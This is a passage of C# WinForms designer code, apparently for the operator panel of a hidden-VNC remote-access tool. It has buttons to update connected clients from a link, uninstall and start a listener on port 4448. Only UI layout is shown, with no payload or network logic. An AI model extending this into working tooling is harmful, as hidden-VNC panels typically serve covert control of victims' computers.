            this.btnresetScale.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnresetScale.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnresetScale.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnresetScale.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnresetScale.Image = ((System.Drawing.Image)(resources.GetObject("btnresetScale.Image")));
            this.btnresetScale.ImageSize = new System.Drawing.Size(40, 40);
            this.btnresetScale.Location = new System.Drawing.Point(119, 6);
            this.btnresetScale.Name = "btnresetScale";
            this.btnresetScale.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnresetScale.Size = new System.Drawing.Size(54, 48);
            this.btnresetScale.TabIndex = 33;
            this.guna2HtmlToolTip1.SetToolTip(this.btnresetScale, "Reset Scale!");
            this.btnresetScale.Click += new System.EventHandler(this.btnresetScale_Click);
            // 
            // btnRemoveHvnc
            // 
            this.btnRemoveHvnc.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnRemoveHvnc.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnRemoveHvnc.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnRemoveHvnc.BorderRadius = 12;
            this.btnRemoveHvnc.BorderThickness = 1;
            this.btnRemoveHvnc.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnRemoveHvnc.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnRemoveHvnc.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnRemoveHvnc.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnRemoveHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnRemoveHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnRemoveHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnRemoveHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnRemoveHvnc.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnRemoveHvnc.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnRemoveHvnc.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnRemoveHvnc.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnRemoveHvnc.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnRemoveHvnc.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnRemoveHvnc.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnRemoveHvnc.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnRemoveHvnc.ForeColor = System.Drawing.Color.White;
            this.btnRemoveHvnc.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnRemoveHvnc.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnRemoveHvnc.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnRemoveHvnc.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnRemoveHvnc.Image = ((System.Drawing.Image)(resources.GetObject("btnRemoveHvnc.Image")));
            this.btnRemoveHvnc.ImageSize = new System.Drawing.Size(40, 40);
            this.btnRemoveHvnc.Location = new System.Drawing.Point(61, 6);
            this.btnRemoveHvnc.Name = "btnRemoveHvnc";
            this.btnRemoveHvnc.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnRemoveHvnc.Size = new System.Drawing.Size(54, 48);
            this.btnRemoveHvnc.TabIndex = 31;
            this.guna2HtmlToolTip1.SetToolTip(this.btnRemoveHvnc, "Uninstall !");
            this.btnRemoveHvnc.Click += new System.EventHandler(this.btnRemoveHvnc_Click);
            // 
            // btnAbouthvnc
            // 
            this.btnAbouthvnc.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnAbouthvnc.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnAbouthvnc.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnAbouthvnc.BorderRadius = 12;
            this.btnAbouthvnc.BorderThickness = 1;
            this.btnAbouthvnc.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnAbouthvnc.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnAbouthvnc.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnAbouthvnc.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnAbouthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnAbouthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnAbouthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnAbouthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnAbouthvnc.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnAbouthvnc.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnAbouthvnc.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnAbouthvnc.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnAbouthvnc.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnAbouthvnc.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnAbouthvnc.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnAbouthvnc.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnAbouthvnc.ForeColor = System.Drawing.Color.White;
            this.btnAbouthvnc.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnAbouthvnc.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnAbouthvnc.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnAbouthvnc.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnAbouthvnc.Image = ((System.Drawing.Image)(resources.GetObject("btnAbouthvnc.Image")));
            this.btnAbouthvnc.ImageSize = new System.Drawing.Size(40, 40);
            this.btnAbouthvnc.Location = new System.Drawing.Point(235, 6);
            this.btnAbouthvnc.Name = "btnAbouthvnc";
            this.btnAbouthvnc.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnAbouthvnc.Size = new System.Drawing.Size(54, 48);
            this.btnAbouthvnc.TabIndex = 30;
            this.guna2HtmlToolTip1.SetToolTip(this.btnAbouthvnc, "About Us!");
            this.btnAbouthvnc.Click += new System.EventHandler(this.btnAbouthvnc_Click);
            // 
            // btnUploadExec
            // 
            this.btnUploadExec.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnUploadExec.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnUploadExec.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnUploadExec.BorderRadius = 12;
            this.btnUploadExec.BorderThickness = 1;
            this.btnUploadExec.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnUploadExec.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnUploadExec.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnUploadExec.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnUploadExec, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnUploadExec, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnUploadExec, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnUploadExec, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnUploadExec.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnUploadExec.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnUploadExec.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnUploadExec.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnUploadExec.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnUploadExec.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnUploadExec.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnUploadExec.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnUploadExec.ForeColor = System.Drawing.Color.White;
            this.btnUploadExec.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnUploadExec.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnUploadExec.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnUploadExec.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnUploadExec.Image = ((System.Drawing.Image)(resources.GetObject("btnUploadExec.Image")));
            this.btnUploadExec.ImageSize = new System.Drawing.Size(40, 40);
            this.btnUploadExec.Location = new System.Drawing.Point(3, 6);
            this.btnUploadExec.Name = "btnUploadExec";
            this.btnUploadExec.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnUploadExec.Size = new System.Drawing.Size(54, 48);
            this.btnUploadExec.TabIndex = 29;
            this.guna2HtmlToolTip1.SetToolTip(this.btnUploadExec, "Update Clients From Link.");
            this.btnUploadExec.Click += new System.EventHandler(this.btnUploadExec_Click);
            // 
            // guna2Separator7
            // 
            this.guna2Separator7.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator7.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2Separator7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Separator7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Separator7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Separator7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Separator7.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2Separator7.Location = new System.Drawing.Point(-5, -5);
            this.guna2Separator7.Name = "guna2Separator7";
            this.guna2Separator7.Size = new System.Drawing.Size(1555, 10);
            this.guna2Separator7.TabIndex = 152;
            this.guna2Separator7.UseTransparentBackground = true;
            // 
            // guna2Panel3
            // 
            this.guna2Panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2Panel3.Controls.Add(this.label14);
            this.guna2Panel3.Controls.Add(this.btnStopHvnc);
            this.guna2Panel3.Controls.Add(this.btnStarthvnc);
            this.guna2Panel3.Controls.Add(this.label13);
            this.guna2Panel3.Controls.Add(this.HVNCListenPort);
            this.guna2Panel3.Controls.Add(this.label12);
            this.guna2Panel3.Controls.Add(this.label9);
            this.loadForm.SetDecoration(this.guna2Panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel3.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.guna2Panel3.Location = new System.Drawing.Point(3, 683);
            this.guna2Panel3.Name = "guna2Panel3";
            this.guna2Panel3.Size = new System.Drawing.Size(1545, 67);
            this.guna2Panel3.TabIndex = 3;
            // 
            // label14
            // 
            this.label14.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label14.AutoSize = true;
            this.label14.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.label14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label14.Font = new System.Drawing.Font("Century Gothic", 11.25F);
            this.label14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.label14.Location = new System.Drawing.Point(19, 26);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(55, 20);
            this.label14.TabIndex = 153;
            this.label14.Text = "Status:";
            // 
            // btnStopHvnc
            // 
            this.btnStopHvnc.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnStopHvnc.Animated = true;
            this.btnStopHvnc.AutoRoundedCorners = true;
            this.btnStopHvnc.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnStopHvnc.BorderRadius = 14;
            this.btnStopHvnc.BorderThickness = 1;
            this.guna2Transition2.SetDecoration(this.btnStopHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnStopHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnStopHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnStopHvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnStopHvnc.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnStopHvnc.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnStopHvnc.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnStopHvnc.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnStopHvnc.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnStopHvnc.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnStopHvnc.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnStopHvnc.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnStopHvnc.ForeColor = System.Drawing.Color.White;
            this.btnStopHvnc.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnStopHvnc.Image = ((System.Drawing.Image)(resources.GetObject("btnStopHvnc.Image")));
            this.btnStopHvnc.Location = new System.Drawing.Point(1272, 21);
            this.btnStopHvnc.Name = "btnStopHvnc";
            this.btnStopHvnc.Size = new System.Drawing.Size(126, 31);
            this.btnStopHvnc.TabIndex = 152;
            this.guna2HtmlToolTip1.SetToolTip(this.btnStopHvnc, "Start/Stop Listener!");
            this.btnStopHvnc.Visible = false;
            this.btnStopHvnc.Click += new System.EventHandler(this.btnStopHvnc_Click);
            // 
            // btnStarthvnc
            // 
            this.btnStarthvnc.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnStarthvnc.Animated = true;
            this.btnStarthvnc.AutoRoundedCorners = true;
            this.btnStarthvnc.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnStarthvnc.BorderRadius = 14;
            this.btnStarthvnc.BorderThickness = 1;
            this.guna2Transition2.SetDecoration(this.btnStarthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnStarthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnStarthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnStarthvnc, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnStarthvnc.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnStarthvnc.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnStarthvnc.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnStarthvnc.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnStarthvnc.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnStarthvnc.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnStarthvnc.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnStarthvnc.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnStarthvnc.ForeColor = System.Drawing.Color.White;
            this.btnStarthvnc.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnStarthvnc.Image = ((System.Drawing.Image)(resources.GetObject("btnStarthvnc.Image")));
            this.btnStarthvnc.Location = new System.Drawing.Point(1404, 21);
            this.btnStarthvnc.Name = "btnStarthvnc";
            this.btnStarthvnc.Size = new System.Drawing.Size(126, 31);
            this.btnStarthvnc.TabIndex = 151;
            this.btnStarthvnc.Click += new System.EventHandler(this.btnStarthvnc_Click);
            // 
            // label13
            // 
            this.label13.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label13.AutoSize = true;
            this.label13.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.label13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label13.Font = new System.Drawing.Font("Century Gothic", 11.25F);
            this.label13.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.label13.Location = new System.Drawing.Point(627, 26);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(172, 20);
            this.label13.TabIndex = 150;
            this.label13.Text = "Status : Connections: 0";
            // 
            // HVNCListenPort
            // 
            this.HVNCListenPort.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.HVNCListenPort.BackColor = System.Drawing.Color.Transparent;
            this.HVNCListenPort.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.HVNCListenPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.guna2Transition2.SetDecoration(this.HVNCListenPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.HVNCListenPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.HVNCListenPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.HVNCListenPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.HVNCListenPort.DefaultText = "4448";
            this.HVNCListenPort.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.HVNCListenPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.HVNCListenPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.HVNCListenPort.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.HVNCListenPort.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.HVNCListenPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.HVNCListenPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HVNCListenPort.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.HVNCListenPort.Location = new System.Drawing.Point(365, 26);
            this.HVNCListenPort.Name = "HVNCListenPort";
            this.HVNCListenPort.PasswordChar = '\0';
            this.HVNCListenPort.PlaceholderText = "";
            this.HVNCListenPort.SelectedText = "";
            this.HVNCListenPort.Size = new System.Drawing.Size(97, 21);
            this.HVNCListenPort.TabIndex = 149;
            // 
            // label12
            // 
            this.label12.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label12.AutoSize = true;
            this.label12.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.label12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label12.Font = new System.Drawing.Font("Century Gothic", 11.25F);
            this.label12.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.label12.Location = new System.Drawing.Point(250, 26);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(105, 20);
            this.label12.TabIndex = 145;
            this.label12.Text = "Listener Port :";
            // 
            // label9
            // 
            this.label9.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label9.AutoSize = true;
            this.label9.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.label9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label9.Font = new System.Drawing.Font("Century Gothic", 11.25F);
            this.label9.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.label9.Location = new System.Drawing.Point(80, 26);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(101, 20);
            this.label9.TabIndex = 143;
            this.label9.Text = "Not Listening";
            // 
            // LISTVIEWSPANELSMALL2
            // 
            this.LISTVIEWSPANELSMALL2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.LISTVIEWSPANELSMALL2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2ControlBox3);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2Separator4);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2ToggleSwitch1);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2ControlBox2);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2Separator3);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.label7);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.label5);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.label6);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2Separator1);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.label1);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2PictureBox5);
            this.LISTVIEWSPANELSMALL2.Controls.Add(this.guna2VSeparator3);
            this.loadForm.SetDecoration(this.LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.LISTVIEWSPANELSMALL2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.LISTVIEWSPANELSMALL2.Dock = System.Windows.Forms.DockStyle.Top;
            this.LISTVIEWSPANELSMALL2.Location = new System.Drawing.Point(0, 0);
            this.LISTVIEWSPANELSMALL2.Name = "LISTVIEWSPANELSMALL2";
            this.LISTVIEWSPANELSMALL2.Size = new System.Drawing.Size(1559, 52);
            this.LISTVIEWSPANELSMALL2.TabIndex = 6;
            this.LISTVIEWSPANELSMALL2.MouseDown += new System.Windows.Forms.MouseEventHandler(this.guna2Panel1_MouseDown);
            // 
            // guna2ControlBox3
            // 
            this.guna2ControlBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2ControlBox3.BorderThickness = 1;
